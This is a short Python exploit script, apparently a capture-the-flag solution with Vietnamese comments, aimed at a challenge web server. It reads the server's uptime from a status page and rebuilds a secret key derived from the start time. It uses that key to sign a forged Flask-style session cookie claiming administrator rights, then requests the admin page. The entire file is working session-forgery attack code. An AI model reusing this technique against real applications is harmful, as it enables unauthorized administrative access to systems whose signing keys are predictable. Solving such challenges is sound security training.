import requests
from datetime import datetime, timedelta
import hashlib
from itsdangerous import URLSafeTimedSerializer
import uuid

url = "http://chal.competitivecyber.club:9999/"
secret = uuid.UUID('31333337-1337-1337-1337-133713371337')

def calculate_server_start_time(formatted_uptime, formatted_current_time):
    current_time = datetime.strptime(formatted_current_time, '%Y-%m-%d %H:%M:%S')
    hours, minutes, seconds = map(int, formatted_uptime.split(':'))
    uptime = timedelta(hours=hours, minutes=minutes, seconds=seconds)
    server_start_time = current_time - uptime
    return server_start_time

def res_time(server_start_time):
    server_start_str = server_start_time.strftime('%Y%m%d%H%M%S')
    secure_key = hashlib.sha256(f'secret_key_{server_start_str}'.encode()).hexdigest()
    return secure_key

def get_time_status(url):
    endpoint = "status"
    res = requests.get(url + endpoint)
    line = res.text.split("<br>")
    uptime = line[0].split(": ")[1]
    current_time = line[1].split(": ")[1].strip()
    return uptime, current_time

def create_uid():
    return str(uuid.uuid5(secret, 'administrator'))

def create_session_cookie(secret_key):
    serializer = URLSafeTimedSerializer(secret_key)
    session_data = {
        'is_admin': True,
        'uid': create_uid(),
        'username': 'administrator'
    }
    session_cookie = serializer.dumps(session_data)
    return session_cookie

def send_request(url):
    # Lấy uptime và current_time từ server
    uptime, current_time = get_time_status(url)
    
    # Tính toán server_start_time
    server_start_time = calculate_server_start_time(uptime, current_time)
    
    # Tạo secure_key
    secure_key = res_time(server_start_time)
    
    # Tạo cookie session được mã hóa
    session_cookie = create_session_cookie(secure_key)
    
    # Gửi yêu cầu HTTP với cookie session
    cookies = {'session': session_cookie}
    response = requests.get(url + '/admin', cookies=cookies)
    print('session_cookie:', session_cookie)
    return response

# Ví dụ sử dụng
response = send_request(url)
print(response.text)